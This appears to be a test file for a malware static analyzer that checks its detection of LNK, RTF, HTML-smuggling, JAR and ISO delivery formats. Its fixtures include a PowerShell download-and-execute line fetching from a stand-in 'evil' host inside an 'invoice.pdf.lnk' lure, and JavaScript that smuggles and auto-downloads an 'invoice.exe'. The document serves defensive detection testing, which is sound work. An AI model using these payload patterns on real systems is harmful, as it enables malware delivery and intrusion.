"""Tests for the delivery-format analyzers: LNK, RTF, HTML-smuggling, JAR, ISO."""

from __future__ import annotations

import io
import struct
import sys
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from aegis.static import analyze_bytes  # noqa: E402
from aegis.static.dispatch import detect_file_type  # noqa: E402
from aegis.static.models import FileType  # noqa: E402


def _ids(r):
    return {i.id for i in r.indicators}


def _lnk(args: str) -> bytes:
    clsid = bytes.fromhex("0114020000000000C000000000000046")
    header = struct.pack("<I", 0x4C) + clsid + struct.pack("<I", 0xA0) + b"\x00" * 52
    return header + struct.pack("<H", len(args)) + args.encode("utf-16-le")


# ── LNK ──────────────────────────────────────────────────────────────────────

def test_lnk_download_exec():
    r = analyze_bytes(_lnk("powershell -w hidden -enc SQBFAFgA ; IEX (New-Object Net.WebClient)"
                           ".DownloadString('http://evil/x')"), filename="invoice.pdf.lnk")
    assert r.file_type == FileType.LNK
    assert "powershell" in (r.lnk.arguments or "")
    assert "lnk.command_execution" in _ids(r)


def test_lnk_interpreter_only():
    r = analyze_bytes(_lnk("powershell"), filename="a.lnk")
    assert r.file_type == FileType.LNK
    assert "lnk.interpreter" in _ids(r)


# ── RTF ──────────────────────────────────────────────────────────────────────

def test_rtf_equation_exploit():
    rtf = rb"{\rtf1\ansi {\object\objemb\objclass Equation.3 {\*\objdata 0102}}}"
    r = analyze_bytes(rtf, filename="doc.rtf")
    assert r.file_type == FileType.RTF and r.rtf.has_equation
    assert "rtf.equation_exploit" in _ids(r)


def test_rtf_embedded_pe():
    hexpe = b"4d5a90000300000004000000ffff0000" * 3  # MZ... >= 16 hex chars
    rtf = rb"{\rtf1 {\object\objclass Package {\*\objdata " + hexpe + rb" }}}"
    r = analyze_bytes(rtf, filename="x.rtf")
    assert r.rtf.embedded_pe and "rtf.embedded_executable" in _ids(r)


# ── HTML smuggling ───────────────────────────────────────────────────────────

def test_html_smuggling():
    b64 = "A" * 600
    html = (f"<!doctype html><html><script>var b='{b64}';var x=atob(b);"
            "var blob=new Blob([x],{type:'application/octet-stream'});"
            "var a=document.createElement('a');a.download='invoice.exe';"
            "a.href=URL.createObjectURL(blob);a.click();</script></html>").encode()
    r = analyze_bytes(html, filename="invoice.html")
    assert r.file_type == FileType.HTML
    assert r.html.smuggling_score >= 0.6
    assert "html.smuggling" in _ids(r)


def test_benign_html_is_html_without_findings():
    r = analyze_bytes(b"<!doctype html><html><body><h1>Hello</h1><p>Welcome.</p></body></html>",
                      filename="index.html")
    assert r.file_type == FileType.HTML
    assert not (_ids(r) & {"html.smuggling", "html.suspicious_script"})


# ── JAR ──────────────────────────────────────────────────────────────────────

def test_jar_exec_and_load():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\r\nMain-Class: Evil\r\n")
        z.writestr("Evil.class", b"\xca\xfe\xba\xbe java/lang/Runtime ProcessBuilder "
                                 b"java/net/URLClassLoader defineClass")
    r = analyze_bytes(buf.getvalue(), filename="app.jar")
    assert r.file_type == FileType.JAR and r.jar.main_class == "Evil"
    assert {"jar.command_exec", "jar.dynamic_load"} <= _ids(r)


# ── ISO ──────────────────────────────────────────────────────────────────────

def test_iso_motw_payload():
    iso = bytearray(0x8100)
    iso[0x8001:0x8006] = b"CD001"
    iso[0x8028:0x8034] = b"MALWARE_DISK"
    iso[0x80F0:0x80FB] = b"invoice.lnk"
    r = analyze_bytes(bytes(iso), filename="delivery.iso")
    assert r.file_type == FileType.ISO
    assert "invoice.lnk" in r.iso.contained_hints
    assert "iso.motw_bypass_payload" in _ids(r)


# ── detection ────────────────────────────────────────────────────────────────

def test_detection_direct():
    assert detect_file_type(_lnk("cmd")) == FileType.LNK
    assert detect_file_type(rb"{\rtf1 hello}") == FileType.RTF
    assert detect_file_type(b"<html><body>hi</body></html>") == FileType.HTML
    iso = bytearray(0x8006)
    iso[0x8001:0x8006] = b"CD001"
    assert detect_file_type(bytes(iso)) == FileType.ISO
